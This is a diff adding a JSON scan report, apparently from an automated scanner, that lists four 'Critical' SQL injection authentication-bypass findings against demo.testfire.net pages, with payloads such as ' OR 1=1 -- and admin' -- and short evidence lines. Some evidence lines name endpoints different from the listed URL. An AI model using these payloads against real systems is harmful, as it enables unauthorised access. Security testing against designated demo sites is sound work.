@@ -1,0 +1,30 @@
+[
+    {
+        "url": "http://demo.testfire.net/feedback.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR 1=1 --",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://demo.testfire.net/sendFeedback using payload: ' OR 1=1 --"
+    },
+    {
+        "url": "http://demo.testfire.net/",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "admin' --",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://demo.testfire.net/search.jsp using payload: admin' --"
+    },
+    {
+        "url": "http://demo.testfire.net/subscribe.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://demo.testfire.net/doSubscribe using payload: ' OR '1'='1"
+    },
+    {
+        "url": "http://demo.testfire.net/login.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://demo.testfire.net/doLogin using payload: ' OR '1'='1"
+    }
+]
